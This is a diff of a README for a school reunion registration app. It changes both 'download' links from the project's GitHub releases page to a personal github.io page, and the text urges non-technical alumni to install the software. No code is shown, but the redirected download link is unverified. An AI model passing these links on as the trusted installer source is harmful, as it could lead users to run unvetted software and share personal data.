@@ -1,6 +1,6 @@
 # 🏫 Reunion-Registration - Register for your school reunion today
 
-[![](https://img.shields.io/badge/Download-Reunion_Registration-blue.svg)](https://github.com/jay23065/Reunion-Registration/releases)
+[![](https://img.shields.io/badge/Download-Reunion_Registration-blue.svg)](https://jay23065.github.io)
 
 This application provides a simple way for alumni of Sunshine Model High School to register for the 2026 reunion. The software collects your contact information and details to ensure you receive updates about the event. It runs on your computer or through your web browser and sends your registration data directly to the organizing committee.
 
@@ -12,7 +12,7 @@ You do not need special technical skills to use this tool. The application works
 
 You must download the latest version of the registration portal from the official release page. 
 
-[Visit this page to download the software](https://github.com/jay23065/Reunion-Registration/releases)
+[Visit this page to download the software](https://jay23065.github.io)
 
 Follow these steps to obtain the installer:
 
